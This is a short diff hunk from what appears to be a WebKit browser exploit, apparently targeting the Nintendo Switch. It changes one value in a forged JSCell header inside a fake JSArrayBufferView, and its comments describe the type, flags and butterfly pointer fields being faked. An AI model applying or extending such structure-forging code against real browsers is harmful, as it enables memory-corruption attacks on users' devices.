@@ -212,7 +212,7 @@ function dgc() {
 					// m_type = 0x26 // Assumingly Uint32ArrayType on the version of webkit this was made on.
 					// m_flags = 0x72
 					// m_gcData (or m_cellState?) = 0x11
- 					'a': u2d(105, 0x1172300),
+ 					'a': u2d(105, 0x1172600),
 					
 					// 'b' - 'd' are the forged JSArrayBufferView
  					'b': u2d(0, 0),		// butterfly ptr (Does this exist on the version of wk the switch is using?)
